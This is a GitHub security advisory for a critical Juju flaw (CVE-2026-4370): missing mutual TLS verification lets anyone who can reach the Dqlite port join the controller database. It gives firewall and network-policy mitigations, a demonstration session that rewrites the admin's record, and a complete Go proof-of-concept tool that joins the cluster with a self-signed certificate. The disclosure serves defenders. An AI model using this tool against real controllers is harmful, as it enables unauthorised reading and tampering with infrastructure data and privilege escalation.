# [C] Juju has Improper TLS Client/Server authentication and certificate verification on Database Cluster

## Summary
Severity: Critical
Advisory: GHSA-gvrj-cjch-728p
CVE: CVE-2026-4370
CWE: CWE-287, CWE-295, CWE-296
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-04-02
Source: https://github.com/advisories/GHSA-gvrj-cjch-728p
Type: github-advisory

## Affected
- Go: `github.com/juju/juju` — affected >=0

## Details
### Impact
Any Juju controller since 3.2.0.

An attacker with only route-ability to the target juju controller Dqlite cluster endpoint
may join the Dqlite cluster, read and modify all information, including escalating privileges,
open firewall ports etc.

This is due to not checking the client certificate, additionally, the client does not
check the server's certificate (MITM attack possible), so anything goes.

https://github.com/juju/juju/blob/001318f51ac456602aef20b123684f1eeeae9a77/internal/database/node.go#L312-L324

#### PoC
Using the tool referenced below.

Bootstrap a controller and show the users:
```
$ juju bootstrap lxd a
Creating Juju controller "a" on lxd/localhost
Looking for packaged Juju agent version 4.0.4 for amd64
<...>
Launching controller instance(s) on localhost/localhost...
 - juju-fefd2b-0 (arch=amd64)
Installing Juju agent on bootstrap instance
Waiting for address
Attempting to connect to 10.151.236.15:22
<...>
Contacting Juju controller at 10.151.236.15 to verify accessibility...

Bootstrap complete, controller "a" is now available
Controller machines are in the "controller" model

Now you can run
	juju add-model <model-name>
to create a new model to deploy workloads.
$ juju users
Controller: a

Name               Display name  Access     Date created  Last connection
admin*             admin         superuser  1 minute ago  just now
juju-metrics       Juju Metrics  login      1 minute ago  never connected
everyone@external
```

Join the cluster with the first cluster member:
```
$ dqlite-demo --db 192.168.1.25:9999 --join 10.151.236.15:17666
dqlite interactive shell.
Enter SQL statements terminated with a semicolon.
Meta-commands: .switch <database>  .close  .exit

Connected to database "demo".
demo>
```

Join the cluster with another cluster member and give the admin a new name:
```
dqlite-demo --db 192.168.1.25:9998 --join 10.151.236.15:17666
dqlite interactive shell.
Enter SQL statements terminated with a semicolon.
Meta-commands: .switch <database>  .close  .exit

Connected to database "demo".
demo> .switch controller
Connected to database "controller".
controller> select * from user;
uuid                                 | name              | display_name | external | removed | created_by_uuid                      | created_at
-------------------------------------+-------------------+--------------+----------+---------+--------------------------------------+----------------------------------------
9d5c7126-1401-4ce6-8603-6a6b5ac90d23 | admin             | admin        | false    | false   | 9d5c7126-1401-4ce6-8603-6a6b5ac90d23 | 2026-03-17 06:38:25.816694339 +0000 UTC
4e1d65ae-564e-4c0e-8ef6-da8b7fb69b53 | juju-metrics      | Juju Metrics | false    | false   | 9d5c7126-1401-4ce6-8603-6a6b5ac90d23 | 2026-03-17 06:38:26.76549689 +0000 UTC
384c57af-57b1-40be-8e6e-7360371895d3 | everyone@external |              | true     | false   | 9d5c7126-1401-4ce6-8603-6a6b5ac90d23 | 2026-03-17 06:38:26.770215095 +0000 UTC
(3 row(s))
controller> update user set display_name='Silly Admin' where name='admin';
OK (1 row(s) affected)
controller>
```

The admin won't like this new name:
```
$ juju users
Controller: a

Name               Display name  Access     Date created   Last connection
admin*             Silly Admin   superuser  6 minutes ago  just now
juju-metrics       Juju Metrics  login      6 minutes ago  never connected
everyone@external
```

### Patches
Juju versions 3.6.20 and 4.0.5 are patched to fix this issue.

### Workarounds
The strongest protection is to apply the security updates. The following mitigations have also been explored. If security updates cannot be applied, you should only apply the following steps as a last resort and restore the original configuration file once updates are applied. Please note that modifying configuration files may stop future unattended upgrades from completing successfully, until these are reverted to the original content.

Option 1: Disable the HA (High Availability) controller. If your environment does not strictly require HA, reducing the cluster to a single controller removes the need for DQlite replication. Moreover, the port that replicates the vulnerability should be blocked, namely 17666.
Option 2: Restrict what IPs can communicate with port 17666, by implementing firewall rules to block all ingress traffic to this port. Only Juju controller IPs should be able to connect to this port.

To restrict access to the DQlite port to just the set of controller IPs, here's an example using ufw for a machine controller. This needs to be run on each controller. If the controller nodes change configuration, the rules will need to be updated accordingly.
You will need to enable access to the controller API port 17070 in accordance with your requirements for allowing clients to connect to the Juju controllers.

```
# Retrict access to the Dqlite port.
sudo ufw allow from <controllerip1> to any port 17666 proto tcp
sudo ufw allow from <controllerip2> to any port 17666 proto tcp
sudo ufw allow from <controllerip3> to any port 17666 proto tcp
sudo ufw deny 17666/tcp
# Similarly, the mongo db port needs to allow controller access.
sudo ufw allow from <controllerip1> to any port 37017 proto tcp
sudo ufw allow from <controllerip2> to any port 37017 proto tcp
sudo ufw allow from <controllerip3> to any port 37017 proto tcp
sudo ufw deny 37017/tcp
# Allow access to the controller API port.
sudo ufw allow from <your cidr goes here> to any port 17070 proto tcp
# Allow access to the controller SSH port.
sudo ufw allow from <your cidr goes here> to any port 22 proto tcp
# Ensure the firewall is enabled.
sudo ufw enable
# Check that the rules have been added correctly.
sudo ufw status
```

For Kubernetes controllers, HA is not supported. We recommend blocking access to port 17666. One way is to apply a network policy:

```
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: controller-0-17666-only-itself
  namespace: <your controller namespace goes here>
spec:
  podSelector:
    matchLabels:
      app.kubernetes.io/name: controller
      statefulset.kubernetes.io/pod-name: controller-0
  policyTypes:
    - Ingress
  ingress:
    - from:
        - podSelector:
            matchLabels:
              app.kubernetes.io/name: controller
              statefulset.kubernetes.io/pod-name: controller-0
      ports:
        - protocol: TCP
          port: 17666
```

### References
https://github.com/juju/juju/blob/001318f51ac456602aef20b123684f1eeeae9a77/internal/database/node.go#L312-L324

### PoC Tool

Based on the go-dqlite demo app.

```go
package main

import (
	"context"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"database/sql"
	"encoding/pem"
	"fmt"
	"log"
	"math/big"
	"net"
	"os"
	"os/signal"
	"path/filepath"
	"strings"
	"time"

	"github.com/canonical/go-dqlite/v3/app"
	"github.com/canonical/go-dqlite/v3/client"
	"github.com/peterh/liner"
	"github.com/pkg/errors"
	"github.com/spf13/cobra"
	"golang.org/x/sys/unix"
)

func generateSelfSignedCert() (tls.Certificate, error) {
	key, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		return tls.Certificate{}, fmt.Errorf("generate key: %w", err)
	}

	tmpl := &x509.Certificate{
		SerialNumber: big.NewInt(1),
		Subject:      pkix.Name{CommonName: "lol"},
		NotBefore:    time.Now(),
		NotAfter:     time.Now().Add(365 * 24 * time.Hour),
		KeyUsage:     x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
		ExtKeyUsage:  []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
		IPAddresses:  []net.IP{net.ParseIP("127.0.0.1")},
		DNSNames:     []string{"lol"},
	}

	certDER, err := x509.CreateCertificate(rand.Reader, tmpl, tmpl, &key.PublicKey, key)
	if err != nil {
		return tls.Certificate{}, fmt.Errorf("create cert: %w", err)
	}

	keyDER, err := x509.MarshalECPrivateKey(key)
	if err != nil {
		return tls.Certificate{}, fmt.Errorf("marshal key: %w", err)
	}

	certPEM := pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: certDER})
	keyPEM := pem.EncodeToMemory(&pem.Block{Type: "EC PRIVATE KEY", Bytes: keyDER})

	return tls.X509KeyPair(certPEM, keyPEM)
}

// runREPL runs an interactive SQL REPL against the given dqlite app.
// It supports multi-line statements (terminated by ';') and the meta-commands
// .switch <database>, .close, and .exit.
func runREPL(ctx context.Context, dqliteApp *app.App, initialDBName string, line *liner.State) error {
	var currentDB *sql.DB
	var currentDBName string

	openDB := func(name string) error {
		if currentDB != nil {
			if err := currentDB.Close(); err != nil {
				fmt.Fprintf(os.Stderr, "Warning: closing previous database: %v\n", err)
			}
			currentDB = nil
			currentDBName = ""
		}
		db, err := dqliteApp.Open(ctx, name)
		if err != nil {
			return fmt.Errorf("open database %q: %w", name, err)
		}
		currentDB = db
		currentDBName = name
		fmt.Printf("Connected to database %q.\n", name)
		return nil
	}

	defer func() {
		if currentDB != nil {
			currentDB.Close()
		}
	}()

	fmt.Println("dqlite interactive shell.")
	fmt.Println("Enter SQL statements terminated with a semicolon.")
	fmt.Println("Meta-commands: .switch <database>  .close  .exit")
	fmt.Println()

	if initialDBName != "" {
		if err := openDB(initialDBName); err != nil {
			return err
		}
	} else {
		fmt.Println("No database selected. Use .switch <database> to open one.")
	}

	prompt := func(multiline bool) string {
		if multiline {
			return "   ...> "
		}
		if currentDBName != "" {
			return currentDBName + "> "
		}
		return "(no db)> "
	}

	var buf strings.Builder

	for {
		input, err := line.Prompt(prompt(buf.Len() > 0))
		if err != nil {
			if err == liner.ErrPromptAborted {
				if buf.Len() > 0 {
					buf.Reset()
					fmt.Println("(statement aborted)")
				}
				continue
			}
			// EOF (Ctrl-D) or liner closed externally — exit cleanly.
			fmt.Println()
			break
		}

		if input != "" {
			line.AppendHistory(input)
		}

		trimmed := strings.TrimSpace(input)
		if trimmed == "" {
			continue
		}

		// Meta-commands are only recognised at the start of a fresh statement.
		if buf.Len() == 0 && strings.HasPrefix(trimmed, ".") {
			parts := strings.Fields(trimmed)
			switch parts[0] {
			case ".exit":
				return nil

			case ".close":
				if currentDB != nil {
					if err := currentDB.Close(); err != nil {
						fmt.Fprintf(os.Stderr, "Error closing database: %v\n", err)
					} else {
						fmt.Printf("Database %q closed.\n", currentDBName)
					}
					currentDB = nil
					currentDBName = ""
				} else {
					fmt.Println("No database is currently open.")
				}

			case ".switch":
				if len(parts) < 2 {
					fmt.Fprintln(os.Stderr, "Usage: .switch <database>")
				} else {
					if err := openDB(parts[1]); err != nil {
						fmt.Fprintf(os.Stderr, "Error: %v\n", err)
					}
				}

			default:
				fmt.Fprintf(os.Stderr, "Unknown meta-command: %s\n", parts[0])
				fmt.Fprintln(os.Stderr, "Available meta-commands: .switch <database>  .close  .exit")
			}
			continue
		}

		// Accumulate SQL across lines.
		if buf.Len() > 0 {
			buf.WriteByte('\n')
		}
		buf.WriteString(input)

		// Execute once the statement is terminated with a semicolon.
		stmt := strings.TrimSpace(buf.String())
		if strings.HasSuffix(stmt, ";") {
			buf.Reset()
			if currentDB == nil {
				fmt.Fprintln(os.Stderr, "Error: no database open. Use .switch <database> to open one.")
				continue
			}
			if err := execSQL(currentDB, stmt); err != nil {
				fmt.Fprintf(os.Stderr, "Error: %v\n", err)
			}
		}
	}

	return nil
}

// execSQL dispatches to execQuery or execStatement based on the leading keyword.
func execSQL(db *sql.DB, stmt string) error {
	// Trim the trailing semicolon just for the prefix check.
	upper := strings.ToUpper(strings.TrimSpace(strings.TrimSuffix(strings.TrimSpace(stmt), ";")))
	switch {
	case strings.HasPrefix(upper, "SELECT"),
		strings.HasPrefix(upper, "WITH"),
		strings.HasPrefix(upper, "PRAGMA"),
		strings.HasPrefix(upper, "EXPLAIN"):
		return execQuery(db, stmt)
	default:
		return execStatement(db, stmt)
	}
}

// execQuery runs a statement expected to return rows and prints them as a table.
func execQuery(db *sql.DB, stmt string) error {
	rows, err := db.Query(stmt)
	if err != nil {
		return err
	}
	defer rows.Close()

	cols, err := rows.Columns()
	if err != nil {
		return err
	}
	if len(cols) == 0 {
		fmt.Println("OK")
		return nil
	}

	// Initialise column widths from the header names.
	widths := make([]int, len(cols))
	for i, c := range cols {
		widths[i] = len(c)
	}

	// Scan all rows into memory so we can compute column widths before printing.
	vals := make([]interface{}, len(cols))
	valPtrs := make([]interface{}, len(cols))
	for i := range vals {
		valPtrs[i] = &vals[i]
	}

	var allRows [][]string
	for rows.Next() {
		if err := rows.Scan(valPtrs...); err != nil {
			return err
		}
		row := make([]string, len(cols))
		for i, v := range vals {
			if v == nil {
				row[i] = "NULL"
			} else {
				row[i] = fmt.Sprintf("%v", v)
			}
			if len(row[i]) > widths[i] {
				widths[i] = len(row[i])
			}
		}
		allRows = append(allRows, row)
	}
	if err := rows.Err(); err != nil {
		return err
	}

	printRow(cols, widths)
	printSeparator(widths)
	for _, row := range allRows {
		printRow(row, widths)
	}
	fmt.Printf("(%d row(s))\n", len(allRows))
	return nil
}

// execStatement runs a non-SELECT statement and prints the rows-affected count.
func execStatement(db *sql.DB, stmt string) error {
	result, err := db.Exec(stmt)
	if err != nil {
		return err
	}
	affected, err := result.RowsAffected()
	if err != nil {
		fmt.Println("OK")
		return nil
	}
	fmt.Printf("OK (%d row(s) affected)\n", affected)
	return nil
}

func printRow(vals []string, widths []int) {
	parts := make([]string, len(vals))
	for i, v := range vals {
		parts[i] = fmt.Sprintf("%-*s", widths[i], v)
	}
	fmt.Println(strings.Join(parts, " | "))
}

func printSeparator(widths []int) {
	parts := make([]string, len(widths))
	for i, w := range widths {
		parts[i] = strings.Repeat("-", w)
	}
	fmt.Println(strings.Join(parts, "-+-"))
}

func main() {
	var db string
	var join *[]string
	var dir string
	var verbose bool
	var dbName string

	cmd := &cobra.Command{
		Use:   "dqlite-demo",
		Short: "Interactive dqlite SQL REPL",
		Long: `An interactive SQL REPL backed by a dqlite cluster node.

Type SQL statements terminated with a semicolon (;) to execute them.
Statements can span multiple lines.

Meta-commands:
  .switch <database>   Open (or switch to) a named database
  .close               Close the current database connection
  .exit                Exit the REPL

Complete documentation is available at https://github.com/canonical/go-dqlite`,
		RunE: func(cmd *cobra.Command, args []string) error {
			nodeDir := filepath.Join(dir, db)
			if err := os.MkdirAll(nodeDir, 0755); err != nil {
				return errors.Wrapf(err, "can't create %s", nodeDir)
			}

			logFunc := func(l client.LogLevel, format string, a ...interface{}) {
				if !verbose {
					return
				}
				log.Printf(fmt.Sprintf("%s: %s: %s\n", db, l.String(), format), a...)
			}

			cart, err := generateSelfSignedCert()
			if err != nil {
				return err
			}
			options := []app.Option{
				app.WithAddress(db),
				app.WithCluster(*join),
				app.WithLogFunc(logFunc),
				app.WithTLS(&tls.Config{
					InsecureSkipVerify: true,
					ClientCAs:          x509.NewCertPool(),
					Certificates:       []tls.Certificate{cart},
				}, &tls.Config{
					InsecureSkipVerify: true,
				}),
			}

			dqliteApp, err := app.New(nodeDir, options...)
			if err != nil {
				return err
			}
			defer func() {
				dqliteApp.Handover(context.Background())
				dqliteApp.Close()
			}()

			if err := dqliteApp.Ready(context.Background()); err != nil {
				return err
			}

			line := liner.NewLiner()
			line.SetCtrlCAborts(true)
			defer line.Close()

			// Forward termination signals by closing the liner, which causes
			// Prompt() to return and the REPL loop to exit cleanly.
			sigCh := make(chan os.Signal, 32)
			signal.Notify(sigCh, unix.SIGPWR, unix.SIGQUIT, unix.SIGTERM)
			go func() {
				<-sigCh
				line.Close()
			}()

			return runREPL(context.Background(), dqliteApp, dbName, line)
		},
	}

	flags := cmd.Flags()
	flags.StringVarP(&db, "db", "d", "", "address used for internal database replication")
	join = flags.StringSliceP("join", "j", nil, "database addresses of existing nodes")
	flags.StringVarP(&dir, "dir", "D", "/tmp/dqlite-demo", "data directory")
	flags.BoolVarP(&verbose, "verbose", "v", false, "verbose logging")
	flags.StringVarP(&dbName, "name", "n", "controller", "initial database name to open on startup")

	cmd.MarkFlagRequired("db")

	if err := cmd.Execute(); err != nil {
		os.Exit(1)
	}
}
```
## Mitigation

The strongest protection is to apply the security updates. The following mitigations have also been explored. If security updates cannot be applied, you should only apply the following steps as a last resort and restore the original configuration file once updates are applied. Please note that modifying configuration files may stop future unattended upgrades from completing successfully, until these are reverted to the original content.

Option 1: Disable the HA (High Availability) controller. If your environment does not strictly require HA, reducing the cluster to a single controller removes the need for DQlite replication. Moreover, the port that replicates the vulnerability should be blocked, namely 17666.
Option 2: Restrict what IPs can communicate with port 17666, by implementing firewall rules to block all ingress traffic to this port. Only Juju controller IPs should be able to connect to this port.

To restrict access to the DQlite port to just the set of controller IPs, here's an example using ufw for a machine controller. This needs to be run on each controller. If the controller nodes change configuration, the rules will need to be updated accordingly.
You will need to enable access to the controller API port 17070 in accordance with your requirements for allowing clients to connect to the Juju controllers.

```
# Retrict access to the Dqlite port.
sudo ufw allow from <controllerip1> to any port 17666 proto tcp
sudo ufw allow from <controllerip2> to any port 17666 proto tcp
sudo ufw allow from <controllerip3> to any port 17666 proto tcp
sudo ufw deny 17666/tcp
# Similarly, the mongo db port needs to allow controller access.
sudo ufw allow from <controllerip1> to any port 37017 proto tcp
sudo ufw allow from <controllerip2> to any port 37017 proto tcp
sudo ufw allow from <controllerip3> to any port 37017 proto tcp
sudo ufw deny 37017/tcp
# Allow access to the controller API port.
sudo ufw allow from <your cidr goes here> to any port 17070 proto tcp
# Allow access to the controller SSH port.
sudo ufw allow from <your cidr goes here> to any port 22 proto tcp
# Ensure the firewall is enabled.
sudo ufw enable
# Check that the rules have been added correctly.
sudo ufw status
```

For Kubernetes controllers, HA is not supported. We recommend blocking access to port 17666. One way is to apply a network policy:

```
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: controller-0-17666-only-itself
  namespace: <your controller namespace goes here>
spec:
  podSelector:
    matchLabels:
      app: controller
      statefulset.kubernetes.io/pod-name: controller-0
  policyTypes:
    - Ingress
  ingress:
    - from:
        - podSelector:
            matchLabels:
              app: controller
              statefulset.kubernetes.io/pod-name: controller-0
      ports:
        - protocol: TCP
          port: 17666
```

## References
- https://github.com/juju/juju/security/advisories/GHSA-gvrj-cjch-728p
- https://nvd.nist.gov/vuln/detail/CVE-2026-4370
- https://github.com/juju/juju
